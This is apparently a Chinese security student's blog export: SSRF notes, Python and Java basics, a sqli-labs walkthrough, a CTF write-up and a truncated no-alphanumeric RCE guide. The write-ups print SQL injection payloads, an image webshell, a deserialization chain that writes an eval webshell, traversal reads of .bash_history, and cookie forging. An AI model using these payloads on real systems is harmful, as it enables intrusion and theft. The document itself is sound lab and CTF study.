[{"title":"ssrf服务端请求伪造攻击","url":"/2025/09/10/ssrf%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB/","content":"SSRF服务端请求伪造攻击服务端请求伪造（Server Side Request Forgery, SSRF），理解为攻击者在没有服务器权限的情况下，利用服务器的漏洞伪装成服务器发起请求的攻击，由于请求是在服务器发起的所以攻击目标一般就是外网无法访问的内部系统\n一般来说会有两个网站1.A网站，所有人都可以访问的外网网站2.B网站，只能内部访问的B网站3，可以通过A网站访问B网站4.所以作为普通用户，我们可以访问A网站，然后篡改获取资源的来源请求B网站的资源，此时A网站并没有对我们的请求做出检测也就是说我们有机会用自己A网站的普通用户身份去访问B网站。\n\nSSRF能干什么可以对服务器所在内网进行端口扫描\n向内部任意主机的任意端口发送恶意构造的数据包，攻击在内网或本地的应用\n利用file协议读取本地文件\nDos 攻击（请求大文件，始终报错keep-alivew alway）\nSSRF漏洞分类根据是否会回显分为三类：\n   1.Basic SSRF:在相应内容中会返回结果。例如，传送一个网址会直接返回这个网址的界面或者对应的html内容，也就是所谓的A网站访问B网站\n   2.Blind SSRF:响应中不返回服务器中的任何信息\n   3.Semi SSRF:响应中不返回请求结果中的所有详细信息，但是会暴露一些数据信息\nSSRF原理SSRF漏洞出现的原因大多是服务端提供了从其他服务器应用获取数据的功能，并且没有对目标地址做正确的过滤与限制。攻击者就有从服务器访问指定URL的网页文本内容，加载图片资源等等，并且由于自身网站并没有做出身份验证等过滤防御行为（也就是没有对发出的请求做身份识别）就会导致用A网站的普通身份访问了B网站\nPHP函数的使用不当可能会导致该漏洞产生具体代码如下\nfile_get_contents()fsockopen()curl_exec()\n\n","tags":["ssrf"]},{"title":"python learn","url":"/2025/08/22/python-learn/","content":"PythonPython 是一种面向对象对的解释型计算机程序设计语言\nPython 是强类型的动态脚本语言\nBugSyntaxError:语法编写错误\nIndentationError：缩进错误\nNameError:命名错误\nDebug设置断点调试\n蓝色是即将运行的的代码\nshow Execution Point 显示执行的断点\nStep into 下一步\nRun to Cursor 跳到下一个断点断点位置 \nEvaluate 用于计算\n可以通过断点的调试看到程序执行的顺序\n输出print(&quot;sjda&quot;,&quot;sdas&quot;,&quot;asda&quot;)#输出三句话print(&quot;&quot;,&quot;&quot;,&quot;&quot;,sep=&#x27;,&#x27;)#添加分隔符print(&quot;&quot;,end=&quot;&quot;)#改变end的方式默认是换行符\n\n变量变量：计算机中的存储空间，用于保存数据\n变量名&#x3D;变量值#等号是赋值运算符\n引号内是字符串，没有引号会被识别成变量名\na=666#解释器做了两件事#在内存中创建了一个666的数据#创建了一个变量a，把666这个数据保存到a变量中去同一变量可以反复赋值print(a)#666a=999print(a)#999\n\n标识符程序员定义的变量名、函数名\n只能由数字、字母、_（下划线）组成\n标识符被包含在（）内对标识符本身没有 影响\n不能是关键字#关键字python 中已经使用的标识符，具有特殊的功能和含义\n变量的命名规范下滑线分割法：多个单词组成的名称，使用小写字母，单词与单词之间使用下划线分开\n数值类型int 整形：任意大小的整数\nnum&#x3D;1\nprint（type（num））\nfloat浮点数：小数\nnum2&#x3D;1.5\nbool布尔型\n有固定写法一个为True 一个为False\nTrue和False必须严格区分大小写\n布尔值可以当作整形对待True相当于整数1，False相当于整数0\ncomplex复数型\n固定写法z&#x3D;a+bj –a是实部 b是虚部 j是虚数单位\n字符串str\n特点需要加上引号，单引号双引号都可以，包含多行内容可以用三引号\n%s占位\nname&#x3D;’bing’\nprint(“我的名字：%s”% name)\n%d整数\nage&#x3D;18\nname&#x3D;’bing’\nprint(“我的名字：%s,年龄：%d”%(name,age))\n%f浮点数\n输出%%\nprint(“我是%%的1%%”%（）)\n格式化输出\nf”{表达式}”\nname&#x3D;‘’\nage&#x3D;‘’\nprint(f”我的名字{name},年龄{age}”)\nif-else判断age=21if age&lt;18:  print(&#x27;爬&#x27;)\n\ninput内默认是字符串\n逻辑运算符\nand与\nor或\nnot非\n#else后面不需要添加任何条件\nif-elifif-else二选一 if-elif 多选一\nwhile循环while 循环条件：\nfor循环for 临时变量 in 可迭代对象\nrange()用来记录循环次数相当于一个计数器字符串编码UTF-8编码，对不同字符用不同的长度来表示\n作用域含义：指的是变量生效的范围，分为两种，分别是全局变量和局部变量\n全局变量：函数外部定义的变量，在整个文件中都是有效的\na&#x3D;100\na=100def test1():    print(&quot;test1中的值&quot;，a)def test2():    a=120    print(&quot;test2中的值&quot;，a)\n\ntest2中的就是局部变量\n全局变量和局部变量命名相同全局变量也不会变\n利用global name 可以将局部变量声明为全局变量\n多个变量需要声明global age,course\nnonlocal 只能对上一级进行修改\n匿名函数lambda 只能实现简单的逻辑\nlambda a,b  a,b是形参\n内置函数import builtins\nprint (dir(builtins))显示了所有内置函数这个东西可以用来查看你在做题是可以运用的函数\n","tags":["python"]},{"title":"sql注入","url":"/2025/08/25/sql%E6%B3%A8%E5%85%A5/","content":"sqli-labs通关1.联合注入（less 1）1.注入点是否存在 即是否有闭合报错,输入id&#x3D;1‘\n2.利用注释符号–+\n3.利用order by 函数观察查询表的列数\n4.查询后利用联合注入爆出注入点\n5.执行恶意查询指令database()\n6.查询该库下的所有表名group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+\n\n7.查询列名\ngroup_concat(column_name) from information_schema.columns where table_name&#x3D;’user’–+\n\n8.查询列里的字段\n\n2.less 2 (数字型注入只有在开头检测有差别)\n\n\n\n直观感受下原代码是 “i’（less1也就是字符型这里需要读取封闭符号取字符串）\n\n\n\nless2 你不管怎么去改它的数字都不会发生变化但是你改封闭符号个数会跳出来再进一步探索\n\n你就会发现它根本不识别字符串这里跳出来数字了所以这里一定读取的是值那就不能出现封闭的情况不然就会被识别为字符串\n一些帮助理解的知识点在MySQL中，把 information_schema  看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。**select：用于指定查询中要返回的字段，如部分已有字段、全部字段（*）、新增计算字段from：**指定查询的数据来源，即表名**where：**用于过滤数据，根据指定的条件排除不符合条件的行**group by：**对字段进行分组聚合，通常与聚合函数一起使用，以便对每个组执行统计或计算**having：**对分组后的结果进行过滤，适用于基于聚合函数的条件筛选**order by：**对查询结果进行排序，可以指定排序的列默认升序，降序要加desc**limit：**限制查询返回的行数，如limit n返回前n行、limit m,n返回m+1到m+n行这里解释了为什么在最后拼接字符段不再需要where的出现，也解释了为什么在from中不需要‘’而where需要的原因。\n3.less3依旧是新的报错需要猜测它原来的查询语句\n\n这里应该是（’i’)其他运用联合注入就可以了\n4.less4\n\n差报错推测原输入为(‘“i”)所以输入要是1”)–+\n接着利用联合注入即可\n5.less 5（报错注入即双注入）无回显点利用group by函数特性创造回显点没有可利用回显点需要学习新东西\nhttps://www.freesion.com/article/9958528915/\n原理：子查询在查询进行时子查询是优先进行的\n\nRand() &#x2F;&#x2F;随机函数，用于产生 0 至 1 之间的随机数\n\nFloor() &#x2F;&#x2F;取整函数，向下舍入为指定小数位数 如：floor(1.45,0)&#x3D; 1;floor(1.55,0) &#x3D; 1\n\nCount() &#x2F;&#x2F;汇总函数\n\nGroup by clause &#x2F;&#x2F;分组语句（利用函数特性）简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用 Group by 分组语句就会把查询的一部分以错误的形式显示出来。\n\n\n\n\n深层次的原因：通过floor报错的方法来爆数据的本质是group by语句的报错。group by语句报错的原因是floor(random(0)**2)的不确定性，即可能为0也可能为1（group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。）group by  floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。\n结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！\n\n参考他人博客\n自我总结：可以理解为在group by 读取数据并且保存在临时表的过程中由于floor（random(0)*2）会出现0和1的性质那么在检测时就会出现security0和security1但是在写入临时表的过程中又被计算了一遍也就是说security0写入可能变成security1，那这时候就重复了，重复就会报错告诉你security1重复了那你也就得到了数据库名了。注意的是可能也就是说有时候需要多次刷新才会显示\n套路公式\npayload：?id=-1&#x27; union select count(*),2,concat((select database()),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+ 这里把查询库的名字命名为a\n\n（这里是需要修改limit的比如limit 1，1 limit 2，1然后一个个去看这里会比较麻烦一些）\n把最终的payload放出来看眼\n?id=-1&#x27; union select count(*),2,concat(&#x27;*&#x27;,(select concat_ws(char(32,44,32),id,username,password) from users limit 1,1),&#x27;*&#x27;,floor(rand()*2))as a from information_schema.tables group by a--+  \n\n\n\n5.less6，9，10（延迟注入法也是报错注入的一种时间盲注）上面的报错注入一样可以用利用sleep（）函数去看漏洞\nhttps://blog.csdn.net/qq_68357559/article/details/137127366\n这个博客里介绍的就可以但是比上面的还要麻烦这个需要利用if函数和sleep函数去尝试出库和表的ASCII码值等于要看你页面延迟然后一个个试很麻烦\n这里我看了另外一种不是利用if函数\n报错注入最全链接https://blog.csdn.net/haishiqiguai/article/details/147591123（写的确实豪）5.less6报错注入updatexml（）函数版https://blog.csdn.net/haishiqiguai/article/details/147591123\n利用updatexml函数\n6.Less7 导出文件GET字符型注入这个是纯试出来的?id&#x3D;1’))–+\n然后用and测试length（database()）测出来是9\n\n然后甚至可以用substr（）一点点爆字母 and substr(database(),1,1)&#x3D;’s’\n这里用导入文件的方式\n用到两个函数 要去前面几关去获取\nbasedir()指定了安装MYSQL的安装路径\ndatadir()指定了安装MYSQL的数据文件路径\n\n:D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\\nD:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\data\\\n\n放个payload吧页面回显失败但是我的文件夹里还是没有出现hack.php失败了，\n这里下一步直接连接蚁剑就可以了。\n7.Less-8，9，10和上面一样用substr一个个爆https://blog.csdn.net/qq_43531669/article/details/96746687\n这篇博客就是专门爆的里面还附带了脚本避免了手工注入的繁复\n8.Less-11Post注入万能密码 admin’ and true# 或者 admin’ or 1&#x3D;1#\n登录成功以后联合查询即可\nless12和上面一样只是改成了(“i”)\n\nless13 password是注入点万能密码123’) or 1&#x3D;1# 这个是无回显爆破相当恶心\nless14和上题一样less15时间延迟但是还是爆破总结感觉sql其实挺公式化的无回显点的时候甚至可以无脑爆破\n也学到挺多的无回显注入还得是脚本方便一个个爆真的构式\n","tags":["sql"]},{"title":"中航大新生赛wp","url":"/2025/11/01/%E4%B8%AD%E8%88%AA%E5%A4%A7%E6%96%B0%E7%94%9F%E8%B5%9Bwp/","content":"新生赛WEB_SSRF_MAIN一个披着SSRF外皮的目录穿越\n\n进来看见皮卡丘还有图片获取，没找到端口有点怀疑放的图片所以我们去看看源码\n\n很明显的SSRF\n\n当你尝试直接访问的时候你就会被拦截回来你改ip也没有用\n这时候就想到了我们可以访问api下的image文件中的任意图片那么也就意味着我们可以通过目录穿越看到前面目录的东西\n\n\n\nhttp://223.254.144.227:21282/api/fetch-image?url=http://127.0.0.1:8888/api/image/../lists\n\n成功访问\n\nhttp://223.254.144.227:21282/api/fetch-image?url=http://127.0.0.1:8888/api/image/../flaaaag\n\nWEB-REV-RCE前面尝试了非常多的过滤手段，最后发现了它只能执行一条命令且不能有间隔符存在什么意思呢\n\n这时候我们去查环境变量\n\nhttp://223.254.144.227:21206/exec?cmd=env\n\nweb5-简单的文件包含这题fuzz工具出了点小问题于是想着自己先试试万一猜出来了呢，就试了最常用的file，\n?file=123\n\n404，那就是找到了\n直接读取flag.php\nhttp://223.254.144.227:21349/?file=flag.php\n\n结束\nweb6-文件上传的门槛这个是根据提示做出来的因为它有include.php去执行，首先你要创建一个图片马\n#define width 1#define height 1  &lt;?php system($_GET[&#x27;c&#x27;]); ?&gt;//创建为.txt\n\ncopy /b 1.jpg + shell.txt shell.jpg//指令\n\n生成图片马上传然后在include.php里面去用指定路径执行命令\n\nWEB7伪造本地ip就行\n\nweb8-任意文件下载根据提示存在history文件目录穿越加上常见文件夹猜测找到payload\n../../../../root/.bash_history\n\n下载文件审计后发现写入flag的命令\n\nmycookie前端代码调用执行查看页面源码就能看见\n&lt;script&gt;     // 使用原生Fetch API替代axios，避免外部依赖     document.getElementById(&#x27;loginForm&#x27;).addEventListener(&#x27;submit&#x27;, async function(e) &#123;         e.preventDefault();                  const username = document.getElementById(&#x27;username&#x27;).value.trim();         const password = document.getElementById(&#x27;password&#x27;).value.trim();         const errorMsg = document.getElementById(&#x27;errorMsg&#x27;);                  errorMsg.style.display = &#x27;none&#x27;;                  try &#123;             // 第一步：验证用户名和密码             const formData = new FormData();             formData.append(&#x27;username&#x27;, username);             formData.append(&#x27;password&#x27;, password);                          const verifyResponse = await fetch(&#x27;/api/login/verify&#x27;, &#123;                 method: &#x27;POST&#x27;,                 body: formData             &#125;);                          const verifyResult = await verifyResponse.json();                          if (verifyResult.code !== 200) &#123;                 errorMsg.textContent = verifyResult.msg;                 errorMsg.style.display = &#x27;block&#x27;;                 return;             &#125;                          // 第二步：获取Cookie（仅使用用户名）             const cookieResponse = await fetch(&#x27;/api/login/get-cookie&#x27;, &#123;                 method: &#x27;POST&#x27;,                 headers: &#123;                     &#x27;Content-Type&#x27;: &#x27;application/json&#x27;                 &#125;,                 body: JSON.stringify(&#123; username: verifyResult.username &#125;)             &#125;);                          const cookieResult = await cookieResponse.json();                          if (cookieResult.code !== 200) &#123;                 errorMsg.textContent = cookieResult.msg;                 errorMsg.style.display = &#x27;block&#x27;;                 return;             &#125;                          // 设置Cookie并跳转首页             document.cookie = `auth_token=$&#123;cookieResult.auth_token&#125;; path=/; max-age=3600`;             window.location.href = &#x27;/&#x27;;                      &#125; catch (error) &#123;             errorMsg.textContent = &#x27;Login failed. Please try again.&#x27;;             errorMsg.style.display = &#x27;block&#x27;;             console.error(&#x27;Login error:&#x27;, error);         &#125;     &#125;); &lt;/script&gt;\n\n16042\nfetch(&#x27;/api/login/get-cookie&#x27;, &#123;    method: &#x27;POST&#x27;,    headers: &#123;        &#x27;Content-Type&#x27;: &#x27;application/json&#x27;,    &#125;,    body: JSON.stringify(&#123;username: &quot;admin&quot;&#125;)&#125;).then(response =&gt; response.json()).then(data =&gt; &#123;    console.log(&quot;API Response:&quot;, data);            document.cookie = `auth_token=$&#123;data.auth_token&#125;; path=/; max-age=3600`;            &#125;);\n\n生成完直接去访问就行\nSpring藏在配置文件里\n\nUNSER&lt;?phpclass gogogo&#123;    public $www = &quot;Lets start! &quot;;    public function __destruct()    &#123;        echo $this-&gt;www;    &#125;&#125;class start&#123;    public $coffe;    public function __tostring()    &#123;        return $this-&gt;coffe-&gt;dense;    &#125;&#125;class soda&#123;    public $gunmu;    public function __get($content)    &#123;        $g = $this-&gt;gunmu;        return $g();    &#125;&#125;class end&#123;    public $content;    public $filename;    public function __invoke()    &#123;        file_put_contents($this-&gt;filename, &quot;&lt;?php exit();&quot; . $this-&gt;content);    &#125;&#125;if (isset($_GET[&#x27;p&#x27;])) &#123;    $ser = unserialize($_GET[&#x27;p&#x27;]);&#125; else &#123;    highlight_file(__FILE__);&#125;\n\n\n\n&lt;?phpclass gogogo &#123; public $www; &#125;class start &#123; public $coffe; &#125;class soda &#123; public $gunmu; &#125;class end &#123; public $content; public $filename; &#125;$end = new end();$end-&gt;filename = &#x27;php://filter/convert.base64-decode/resource=1.php&#x27;;  $end-&gt;content = &#x27;aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&#x27;;$soda = new soda();$soda-&gt;gunmu = $end;$start = new start();$start-&gt;coffe = $soda;$gogogo = new gogogo();$gogogo-&gt;www = $start;echo serialize($gogogo) . &quot;\\n\\n&quot;;?&gt;\n\nPOP链\ngogogo::__destruct -&gt; start::__toString -&gt; soda::__get -&gt; end::__invoke\n\nexit()的死亡绕过上网搜一搜base64编码绕过在我们的木马前面+a让前面的exit变成乱码将文件名写出php协议base64解码的形式\npayload：O:6:&quot;gogogo&quot;:1:&#123;s:3:&quot;www&quot;;O:5:&quot;start&quot;:1:&#123;s:5:&quot;coffe&quot;;O:4:&quot;soda&quot;:1:&#123;s:5:&quot;gunmu&quot;;O:3:&quot;end&quot;:2:&#123;s:7:&quot;content&quot;;s:41:&quot;aPD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;;s:8:&quot;filename&quot;;s:49:&quot;php://filter/convert.base64-decode/resource=1.php&quot;;&#125;&#125;&#125;&#125; \n\n\n\n这样就成功啦直接连接就行\nweb进阶题1用御剑扫了一下目录发现了登录端口一开始会被里面有的前端代码误导因为找半天你会发现你找不到里面可能有的已经加密的密码泄露所以怀疑有登录界面也就是register.html\n给的提示也是很明显要自己注册看了一下后台有一段前端代码被注释掉了\n仔细看你会发现这个就是注册表单，它是有action属性的接下来执行\nconsole.log(&#x27;=== 启用注册表单 ===&#x27;);const registerComments = [];const walker = document.createTreeWalker(    document.body,    NodeFilter.SHOW_COMMENT,    null,    false);let comment;while (comment = walker.nextNode()) &#123;    if (comment.textContent.includes(&#x27;registerForm&#x27;)) &#123;        registerComments.push(comment);    &#125;&#125;if (registerComments.length &gt; 0) &#123;    registerComments.forEach(comment =&gt; &#123;        const tempDiv = document.createElement(&#x27;div&#x27;);        tempDiv.innerHTML = comment.textContent;        comment.parentNode.replaceChild(tempDiv, comment);    &#125;);&#125; \n\n在控制台中执行得到\n\n这里建议用burpsuite去注册这样的话才能得到它后台给你的注册信息。\n\n主要看那个error这里是中文乱码扔给AI就知道它说啥了，这里我们会得到两个关键信息admin已经被注册了然后就是密码需要大写小写字母加数字后面就会有注册成功然后登入就行\nweb进阶题2在用户登录过后底下会有两个文章一个是关于弱口令的，一个是关于sql注入的，弱口令可以让我们登录admin_lang这个账号，然后我们就可以去用户查询里面去找sql漏洞啦。\n\n第一个payload验证sql注入漏洞的存在\n&#x27; or &#x27;1&#x27;=&#x27;1\n\n联合注入测试\n&#x27; UNION SELECT 1,2,3,4-- -\n\n&#x27; UNION SELECT 1,2,3,database()-- -\n\n&#x27; UNION SELECT 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database()-- -\n\n这里其实不确定在哪个里面我是都查了不过wp不多说flag在users里面\n&#x27; UNION SELECT 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;-- -\n\n找到flag啦\ngroup_concat(flag) from users-- -\n\nweb进阶3主播其实先写的3写出来flag交不了2才发现自己先写的三哈哈哈哈\n三主要是在有个挑战的界面里面去看源码就很容易发现\n\n里面有AK和SK一开始我也不会\nhttps://blog.csdn.net/qq_34851291/article/details/140209099\n去看了这篇文章以后还误把加速服务给当成主机连接对象了（OSS Browser真的能登录的上但是你看不见任何东西因为会出现网络问题），不过这个也给我很大启发那就是云端服务就那么几个而且他们的AK是有明显特征的我可以去试试，于是我在行云管家这里找到了。\n\n这是一个华为云主机，对比公网ip你就会发现一模一样不过可惜的是应该是权限不够的问题所以我们没办法直接导入主机会失败。但是华为云肯定是有相应的登入方式的也就是OBS Browser+ AK SK登录以后你就会看到桶了\n\n\n\n结束。\n天才的疏忽hint 1\n\n\n\n进去以后直接登录就行\nhint2\n\nhint3\n\n\n\n前端代码执行或者直接访问都行\n\n找到你要构建的权限了\n\n有token这里是jwt加密，加密时需要密钥\n找密钥hint2去GitHub里面找\n\n\n\nWEB_REV_SQL此题在query里忘记过滤了列名直接查询password和username就行\nMISC似曾相识但又看不出来\n\n\n\n\n\nDNA,4的三次方联想到base64编码\n\n\n\n\n\n\n\nAI神力，一眼粥小写+空格\n第二个包是zip伪加密直接工具解开就行\n然后你会得到一张图片\n\n然后这个图片末端还隐藏了两张图片合理推测双图片盲水印\n36142\n\n相当可怕的flag\nwireshark的使用把那几个灰色的打开追踪流查看就行","tags":["比赛wp"]},{"title":"java learn 1","url":"/2025/08/20/java-learn%201/","content":"java 基础多写（代码） 多写（笔记） 多写（文章）多练（交流） 多练（思维） 多练（技能）多分享（知识） 多提问（怎么了） 多思考（为什么）什么是计算机能够按照程序运行、自动、高速处理海量数据的现代化智能电子设备\n由硬件和软件所组成\ndos命令执行台小技巧shift+鼠标点击在此处打开命令执行窗口\ndir查看目录\n切换目录 cd change directory\ncls 清理屏幕\nipconfig查看电脑的ip(window11用不了)\nping+url命令查看网络连接状态\nmd 目录名 #创建\nrd 目录名 #删除\ncd 文件名  #cd ..回到上一级#cd&gt;创建\ndel 文件名# 删除\nHelloWorldpublic class Hello&#123;    public static void main(String[] args)&#123;        System.out.print(&quot;hello,World&quot;);    &#125;&#125;\n\nVisual Code可以直接运行\n还有javac编译生成class文件后运行的方法\n可能遇见的情况1.每个单词的大小写不能出现问题java是大小写敏感的\n2.尽量使用英文；\n3.文件名一定要和类名保持一致\n4.符号使用了中文\n外边是一个类里面是一个方法\nJava开发环境java程序运行机制编译型：将我们的代码解释成计算机能够执行的形式执行速度很快#操作系统\n解释型：像一个翻译官，编译一句翻译一句，对执行速度要求没有那么高#网页\njava源文件到class文件就是编译的过程\n\nJava的基础语法注释//123123#单行注释/*2131231*/#多行注释/***@Description HelloWorld*@Author*/#文档注释\n\n标识符所有标识符都应该以字母美元或者下划线开始\n首字母之后可以是字母美元符下划线或数字的任何字符组合\n标识符是大小写敏感的\n可以是中文\n数据类型强类型语言要求变量的使用要严格符合规定所有变量都必须先定义后使用\n八大基本数据类型&#x2F;&#x2F;整数\nint num1&#x3D;10;最常用\nbyte num2&#x3D;20;\nshort num3&#x3D;30;\nlong num4 &#x3D;30L;Long类型要中数字后面加个L\n&#x2F;&#x2F;小数\nfloat num5 &#x3D; 50.1F; Lfloat 类型要在数字后面加个F\ndouble num6&#x3D;3.141592391293；\n&#x2F;&#x2F;字符\nchar name&#x3D;’国’\n&#x2F;&#x2F;字符串\nString不是关键字，类\n&#x2F;&#x2F;布尔值：是非\nboolean flag &#x3D;true;\n整数拓展： 进制二进制0b 十进制 八进制0  十六进制0x\nint i =10;int i2 =010;//八进制0int i3 = 0x10;//十六进制0x  0~9 A~F 16System.out.println(i);System.out.println(i2); \n\n浮点数扩展//BigDecimal 数学工具类//float   有限 离散  含入 误差 大约 接近但不等于//最好完全避免使用浮点数进行比较float f = 0.1f; //0.1  double d =1.0/10;//0.1System.out.println(f==d);//falsefloat d1 =23111132123123123123123f;float d2 =d1+1;System.out.println(d1==d2);//true\n\n字符拓展char c1 &#x3D;’a’;\nchar c2 &#x3D; ‘中’\nSystem.out.println(c1);\nSystem.out.println((int)c1);&#x2F;&#x2F;强制转换\n&#x2F;&#x2F;所有的字符本质还是数字\nchar c3 &#x3D;’\\u0061’;\nSystem.out.println(“c3”);&#x2F;&#x2F;a\n&#x2F;&#x2F;编码 Unicode 表：（97&#x3D;a 65&#x3D;A）\n&#x2F;&#x2F;转义字符\n&#x2F;&#x2F;\\t 制表符\n&#x2F;&#x2F;\\n 换行\n&#x2F;。。。\n布尔值拓展boolean flag&#x3D;true；\nif(flag&#x3D;&#x3D;true){}&#x2F;&#x2F;新手\nif (flag){}&#x2F;&#x2F;老手\n类型转换低到高\nbyte,short,char→int→long→float→double\npublic class Demo06&#123;    public static void main(String[] args)&#123;    //操作比较大的数的时候，注意溢出问题    //JDK7新特性，数字之间可以用下划线分割    int money = 10_0000_0000;    int years =20;    int total =money *years;//-1474836480,计算的时候溢出了    long total2 = money*years;    long total3 =money*((long)years);        System.out.print(&quot;total3&quot;);    &#125;&#125;/*注意点1.不能对布尔值进行转换2.不能把对象类型转换为不相干的类型3.在把高容量转换到低容量的时候，强制转换4.转换的时候可能存在内存溢出，或者精度问题*/\n\n&#x2F;&#x2F;强制转换 （类型）变量名 高到低\n&#x2F;&#x2F;自动转换  低到高\n变量java是一种强类型语言，每个变量都必须声明其类型\njava变量是程序中最基本断点存储单元，其要素包括变量名，变量类型和作用域\npublic class Demo08&#123;//属性：变量//类变量//实例变量：从属于对象：如果不自行初始化，这个类型的初始值//布尔值：默认是false//除了基本类型其余的默认值都是null//main方法String name;int age;  public static void main(String[] args)&#123;  //局部变量：必须声明和初始化值  int i =10;  System.out.println(i);  //变量类型 变量名字 = new Demo08()  Demo08 demo08 = new Demo08()  System.out.println(demo08.age);    System.out.println(demo08.name);  &#125;&#125;\n\n包机制包的本质是一个文件夹\n一般利用公司域名倒置作为包名；com.baidu.www\n包名主要是为了防止重复的问题（web中解题的时候可以去看com www包中的东西）\n","tags":["java"]},{"title":"无字符数字RCE","url":"/2025/08/20/%E6%97%A0%E5%AD%97%E7%AC%A6%E6%95%B0%E5%AD%97RCE/","content":"无字母数字rce1.临时文件上传 原理：无字母数字要实现远程指令操作，也就是要想办法绕过网站过滤的指令，而通过post上传文件（和文件夹tmp联系一起，把指令直接在网站内的tmp中执行绕过了过滤的环节）此时php会在Linux里的临时文件夹保存文件，且文件一定是php加上6个随机的字符，6个随机字符会出现大写的情况，文件的位置是&#x2F;tmp&#x2F;php??????。根据6个字符会出现大写的情况，我们在编辑访问的时候要确保我们提交的东西被执行也就是匹配问题。无字母数字的条件下我们一般会使用glob通配符”？”去解决也就是**. &#x2F;???&#x2F;?????????(. &#x2F;tmp&#x2F;php??????)【这条指令的含义是php运行这个文件所在位置包含的东西（. &#x2F;表示执行**）】但是后面的9个“？”能够匹配的文件太多了，也就会导致无法执行到我们提交的文件。所以要根据上传文件后六个字符随机出现大写的特性去匹配，\n而glob支持使用类似[0-9]的形式去表达范围，那么类似我们可以查询ASCII码表\n\n可以发现表达所有大写字母可以用[@-[]去表示所以原来的指令写成. &#x2F;???&#x2F;????????[@-[]（表示最后一位字符是大写字母的情况），因为生成的后六位字符大写情况是随机的所以可能需要多次提交去匹配。\n实现临时文件上传构建html页面有关html的知识点1.构建网页的基本结构&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt; &lt;!--对于中文网页需要使用此条声明编码有些浏览器会设置GBK为默认编码--&gt;&lt;title&gt; &lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;/body&gt;&lt;/html&gt;\n\n2.一些常见的标签以及标签知识HTML标题\n&lt;h1&gt; 这是一段标题&lt;/h1&gt;&lt;h2&gt;           &lt;/h2&gt;\n\n\n\nHTML段落\n&lt;p&gt;这是一个段落 &lt;/p&gt;\nHTML链接\n&lt;a href=&quot;链接&quot;&gt;这是一个链接&lt;/a&gt;\nHTML图像\n&lt;img src=&quot;/images/logo.png&quot; width=&quot;258&quot; height=&quot;39&quot; /&gt;\n3.关于标签与元素\nHTML元素以开始标签起始 以结束标签终止。例子：  元素的内容在开始与结束标签之间\n2.构建文件上传网页&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;https://648cc2ce-53dc-47cb-b1b0-8fcdcbf1e724.challenge.ctf.show/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt;    &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;\n\n下面代码是对网页做了一个大小的动态调整使得这个网页能够在任何设备上正常显示\n&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\n\nform标签是创建表单，用于用户输入\naction属性是**标签的一个重要组成部分，它定义了当表单提交时，表单数据应该发送到哪里。这个属性的值可以是一个文件名，处理表单数据的脚本，或者是一个服务器的URL。\nenctype属性‌用于规定表单数据在发送到服务器之前如何进行编码。它主要有三个取值：\n1.application&#x2F;x-www-form-urlencoded：这是默认的编码方式，表单数据被编码为名称&#x2F;值对（即键值对），适用于大多数常规的表单提交。在这种编码方式下，所有字符都会进行编码，空格被编码为“+”号，特殊字符被编码为ASCII十六进制值‌12。\n2.‌multipart&#x2F;form-data‌：这种编码类型用于文件上传。表单数据被编码为一条消息，每个控件对应消息中的一个部分。这种编码方式不对字符进行编码，适用于包含文件上传控件的表单。使用这种编码方式时，必须配合POST方法提交表单‌12。\n3.‌text&#x2F;plain：表单数据以纯文本形式进行编码，不含任何控件或格式字符。这种编码方式较少使用‌\nlabel属性是一个标签为为 input 元素定义标注（标记）”for” 属性可把 label 绑定到另外一个元素。把 “for” 属性的值设置为相关元素的 id 属性的值。\ninput的功能取决于type，type&#x3D;file定义文件选择字段和 “浏览…” 按钮，供文件上传。\ntype&#x3D;submit定义提交按钮。\n3.burp截取上传请求并修改添加指令先ls查询当前目录文件 下图是ctfshow web56时添加的指令作为参考\n\n没有出现结果多发送几次原理上面有解释。\n思路：以下三种都是直接通过将原来指令一个字母一个字母用字符替换（通过运算公式去实现）的形式\n2.取反原理：每一个字母用“~“取反后得到的url编码再次取反还是它本身\n&lt;?php    $a=urlencode(~&#x27;php&#x27;)    echo $a;    echo 